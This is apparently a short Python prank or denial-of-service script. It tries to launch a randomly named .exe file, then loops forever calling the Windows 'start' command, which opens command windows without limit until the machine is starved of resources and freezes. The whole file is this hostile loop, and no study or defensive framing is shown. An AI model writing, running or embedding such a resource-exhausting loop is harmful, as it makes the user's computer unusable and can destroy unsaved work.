import os, random

file_name = str (random.randint(0,50)) + ".exe"

os.system(f"{file_name}")

while True:
    os.system("start")